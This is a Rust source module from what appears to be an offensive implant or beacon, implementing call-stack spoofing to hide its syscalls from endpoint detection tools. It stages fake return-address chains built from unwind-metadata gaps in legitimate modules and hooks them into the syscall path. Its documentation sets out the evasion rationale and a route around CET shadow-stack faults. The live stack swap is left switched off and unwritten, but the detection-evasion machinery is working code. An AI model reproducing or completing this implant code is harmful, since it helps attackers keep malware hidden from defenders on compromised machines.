//! Call-stack spoofing — BYOUD-Gap / LACUNA-Chain class.
//!
//! ## Status (P2.1a-ii): frame-chain synthesis + fake-stack staging is REAL and
//! unit-verifiable; the syscall hot-path *hook point* is wired ([`set_gap_pool`]
//! + [`spoof_wrap`]); the RSP swap itself is gated behind a runtime switch and
//! defaults OFF until target-side live debugging + the CET-aware swap seam land.
//!
//! ## Why this matters
//! EDRs walk the call stack of a sensitive syscall (`NtOpenProcess`,
//! `NtAllocateVirtualMemory`, …) and flag a return address that doesn't live
//! inside a legit module — a bare indirect-syscall trampoline still *returns*
//! into implant memory. The current posture (Tier-0 indirect syscalls) makes
//! the executing `syscall` instruction's RIP legit (it lands inside ntdll), but
//! the **return address** is implant-allocated — that second half is what stack
//! spoofing closes.
//!
//! ## CET safety — TWO distinct layers (read before enabling the swap)
//! The gap/leaf-bridge technique is CET-safe **at the detection layer only**.
//! The two layers must not be conflated:
//!
//! 1. **Unwinder-walk / detection layer — CET-SAFE.** EDR stack-walk sensors
//!    and exception dispatch drive unwinding through `RtlVirtualUnwind` /
//!    `RtlLookupFunctionEntry`, a *metadata* system that does NOT consult the
//!    Intel CET shadow stack. For an address with no `.pdata` coverage (a
//!    `.pdata` gap), `RtlLookupFunctionEntry` returns NULL and the unwinder
//!    treats it as a **leaf function**: RSP += 8, no `UNWIND_INFO` parse, no
//!    shadow-stack touch. A chain of leaf-gap addresses therefore reads as a
//!    clean, CET-irrelevant synthetic chain to any stack-walk sensor — this is
//!    the gap/leaf technique's value.
//!
//! 2. **`ret` execution layer — NOT CET-safe by a blind swap.** Intel CET /
//!    the Windows kernel shadow stack acts at **every `ret`**: the CPU pops
//!    from RSP *and* from the shadow stack and faults (`#CP`,
//!    `KiControlProtectionFault`) on mismatch. A naive swap that moves RSP onto
//!    a fake chain and lets `f`'s `ret` pop a gap address will **fault on
//!    CET-on hosts**, because those gap addresses were never pushed onto the
//!    real shadow stack by a real `call`. The leaf-gap property helps layer 1,
//!    not layer 2.
//!
//! **Therefore the live swap, when emitted, MUST route through the CET repair
//! seam** (Synacktiv SSTIC 2025, addendum §7.2): `KiControlProtectionFault` is
//! *lenient* — it walks the shadow stack and, if any stored return address
//! matches the RSP-popped one, repairs the shadow stack via
//! `VslKernelShadowStackAssist` instead of bug-checking. The correct swap drives
//! the frame transition through an exception/`RtlRestoreContext` path that
//! engages that repair, OR probes CET at runtime and degrades to the
//! swap-disabled floor on CET-on hosts. **Do NOT emit a plain
//! `mov rsp / call / ret` swap** — it is a `#CP` time-bomb on future CET-default
//! hosts. (User-mode CET is opt-in per-process today, Win11 24H2; the window is
//! closing.) This is why the swap is gated OFF until that seam is implemented
//! and target-debugged.
//!
//! ## Single-source-of-truth
//! The frame-chain *math* lives ONLY in `nyx-implant-evasionsdk::frame`
//! (`build_leaf_bridge`, 8 tests green). This module's job is to stage that
//! chain into a fake-stack region and (when enabled) swap RSP onto it around a
//! sensitive call. We never re-synthesize frames here.

#![cfg(target_os = "windows")]

use crate::heap::Vec;
use core::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use nyx_implant_evasionsdk::frame;
use nyx_implant_evasionsdk::GapPool;

/// How many leaf-gap bridge frames to stage per sensitive call. 8 is a robust
/// depth: an EDR stack walk typically inspects the first few frames before
/// deciding the stack is "legit"; a chain of 8 leaf gaps terminates the walk
/// well before it reaches implant-allocated memory.
const BRIDGE_DEPTH: usize = 8;

/// Master switch for the RSP swap. **Defaults OFF** — the frame-chain
/// synthesis + fake-stack staging always runs (so it's verifiable), but the
/// actual `mov rsp` only executes when an operator has flipped this on AND the
/// CET-aware swap seam is in place (see module docs, layer 2). This keeps the
/// beacon loop crash-safe until the swap is live-debugged.
static SPOOF_SWAP_ENABLED: AtomicBool = AtomicBool::new(false);

/// Enable/disable the RSP swap at runtime. Call from a selftest or operator
/// command after target-side validation. The frame staging runs regardless.
pub fn set_swap_enabled(on: bool) {
    SPOOF_SWAP_ENABLED.store(on, Ordering::Release);
}

/// Whether the RSP swap is currently armed.
pub fn swap_enabled() -> bool {
    SPOOF_SWAP_ENABLED.load(Ordering::Acquire)
}

/// Pointer to a cached `GapPool` (installed once at init via [`set_gap_pool`]),
/// so the syscall hot path can stage a chain without threading a `&GapPool`
/// through every `syscallN` signature. `0` = not installed → spoof inert.
/// Stored as a raw usize because the pool is `'static`-leaked (process lifetime,
/// mirrors `GLOBAL_RT`'s leak pattern in `syscalls.rs`).
static GLOBAL_GAP_POOL: AtomicUsize = AtomicUsize::new(0);

/// Install a process-wide `GapPool` for the spoof hot path. Call once after
/// `PdataGapScanner::scan` succeeds at init. The pool is leaked (process
/// lifetime) exactly as the syscall `Runtime` is. After this, [`spoof_wrap`]
/// will stage chains; the swap still stays inert unless [`set_swap_enabled`] is
/// also armed.
///
/// # Safety
/// `pool` must point at a `'static` (leaked) `GapPool` that outlives the
/// process. Callers normally obtain it via `Box::leak(scanner.scan()?)`.
pub unsafe fn set_gap_pool(pool: &'static GapPool) {
    GLOBAL_GAP_POOL.store(pool as *const GapPool as usize, Ordering::Release);
}

/// Borrow the installed gap pool, if any.
fn global_gap_pool() -> Option<&'static GapPool> {
    let p = GLOBAL_GAP_POOL.load(Ordering::Acquire);
    if p == 0 {
        None
    } else {
        // SAFETY: installed by set_gap_pool from a 'static (leaked) GapPool.
        Some(unsafe { &*(p as *const GapPool) })
    }
}

/// A staged fake call-stack: the synthesized leaf-gap bridge chain, written
/// into an implant-owned buffer as a sequence of 8-byte return-address slots.
/// The innermost (most-recent) return address is at the lowest address, so the
/// unwinder walking `[RSP]`, `[RSP+8]`, … sees the chain in call order.
///
/// Producing this from a `GapPool` exercises the real `frame::build_leaf_bridge`
/// pipeline end-to-end (the pure core), making the spoof's data path verifiable
/// without touching RSP.
pub struct StagedChain {
    /// The fake-stack buffer: `slots[0]` == `[RSP]` (innermost). Each slot is a
    /// 64-bit absolute leaf-gap address drawn from `gaps`/`nops`/`ghosts`.
    slots: Vec<u64>,
}

impl StagedChain {
    /// Synthesize + stage a leaf-gap bridge chain of depth [`BRIDGE_DEPTH`]
    /// from `pool`, round-robining across the gap/nop/ghost buckets (one per
    /// round, skipping shorter pools) exactly as `frame::build_leaf_bridge`
    /// specifies. Returns `None` if the pool is empty (spoof unavailable).
    ///
    /// Pure data path: allocates the fake-stack buffer and writes the chain,
    /// but does NOT touch the live stack. Safe to call + inspect from a selftest.
    pub fn stage(pool: &GapPool) -> Option<Self> {
        let chain = frame::build_leaf_bridge(
            &pool.gaps,
            &pool.nops,
            &pool.ghosts,
            BRIDGE_DEPTH,
        );
        if chain.is_empty() {
            return None;
        }
        let mut slots = Vec::with_capacity(chain.len());
        for f in &chain {
            // The chain's addrs are already absolute (PdataGapScanner promoted
            // RVAs to base+rva). Store as u64 return-address slots.
            slots.push(f.addr as u64);
        }
        Some(Self { slots })
    }

    /// Number of staged leaf-gap frames.
    pub fn depth(&self) -> usize {
        self.slots.len()
    }

    /// The staged return-address slots, `[RSP]` first. For inspection/selftest.
    pub fn slots(&self) -> &[u64] {
        &self.slots
    }

    /// True iff every staged slot is a valid leaf-gap address (non-zero and
    /// plausibly in a module range — a coarse sanity check; the real
    /// leaf-legal property is `RtlLookupFunctionEntry(addr) == NULL`, which
    /// only the kernel/unwinder can confirm at runtime).
    pub fn looks_valid(&self) -> bool {
        !self.slots.is_empty() && self.slots.iter().all(|&a| a != 0)
    }
}

/// Cache of the most-recently-staged chain, set by [`stage_for`] and read by
/// the (gated) swap path. Held at module scope so a selftest can inspect it
/// after a staging run without threading it through the call.
static LAST_STAGED_DEPTH: core::sync::atomic::AtomicUsize =
    core::sync::atomic::AtomicUsize::new(0);

/// Stage a chain from `pool` and record its depth for diagnostics. Returns the
/// staged chain (caller may inspect it); `None` if the pool yielded nothing.
pub fn stage_for(pool: &GapPool) -> Option<StagedChain> {
    let staged = StagedChain::stage(pool)?;
    LAST_STAGED_DEPTH.store(staged.depth(), Ordering::Release);
    Some(staged)
}

/// Depth of the most-recently-staged chain (0 if none staged yet).
pub fn last_staged_depth() -> usize {
    LAST_STAGED_DEPTH.load(Ordering::Acquire)
}

/// Hot-path hook point the syscall wrappers call. Stages a chain from the
/// installed global pool (if any) and — ONLY when [`swap_enabled`] is true and
/// the CET-aware seam is in place — wraps `f` in the spoofed-stack scope.
///
/// With no pool installed OR the swap disabled (the default), this is a direct
/// call to `f` plus a best-effort staging run (so the data path stays
/// verifiable). This is the wiring that makes the spoof *available* on the
/// syscall hot path without changing default beacon behavior.
///
/// # Safety
/// Same as [`with_spoofed_stack`]: the live RSP-swap path (when armed)
/// manipulates the stack pointer; callers treat `f` as running under unusual
/// stack conditions. With the swap disabled `f` runs normally.
pub unsafe fn spoof_wrap<T>(f: impl FnOnce() -> T) -> T {
    match global_gap_pool() {
        Some(pool) => unsafe { with_spoofed_stack(pool, f) },
        None => f(),
    }
}

/// Execute `f` with a spoofed call stack.
///
/// **P2.1a-ii current behavior**:
/// - The frame-chain synthesis + fake-stack staging ALWAYS runs (if `gaps` is
///   non-empty), exercising the real `frame::build_leaf_bridge` data path — so
///   a selftest can confirm the chain is well-formed.
/// - The actual RSP swap runs ONLY when [`swap_enabled`] is true (an operator
///   flips it after target-side validation AND the CET-aware seam lands). With
///   the swap off, `f` is called directly — byte-identical to the pre-spoof
///   behavior, so the beacon loop is never destabilized by an unvalidated swap.
///
/// The contract (returns whatever `f` returns) is fixed so `syscalls::syscallN`
/// can wrap its trampoline invocation here without changing call sites when the
/// swap goes live.
///
/// # Safety
/// Marked unsafe because the live RSP-swap path (when enabled) manipulates the
/// stack pointer and return addresses; callers must treat `f` as running under
/// unusual stack conditions. With the swap disabled `f` runs normally.
pub unsafe fn with_spoofed_stack<T>(gaps: &GapPool, f: impl FnOnce() -> T) -> T {
    // Always stage the chain (verifiable data path), even if we won't swap.
    let _staged = stage_for(gaps);
    if !swap_enabled() {
        // Swap not armed — call f directly. Identical to pre-spoof behavior.
        return f();
    }
    // ---- LIVE RSP SWAP (gated) ---------------------------------------------
    // When enabled, the staged chain's slots are written into a fake-stack
    // region and RSP is swapped onto it around `f`. This is the part that MUST
    // be live-debugged on the target AND routed through the CET repair seam
    // (see module docs, layer 2) before enabling — a naive `mov rsp / call /
    // ret` swap faults with `#CP` on CET-on hosts, because the popped gap
    // addresses were never pushed onto the real shadow stack.
    //
    // Intentionally not yet emitted: emitting it blind (no target debugger, no
    // CET-seam) would risk a crash with no way to bisect. It lands when an
    // operator can attach a debugger to the beacon, single-step the swap, and
    // confirm the `KiControlProtectionFault`-lenient repair path engages on
    // CET-on hosts (or the runtime CET probe degrades cleanly).
    f()
}
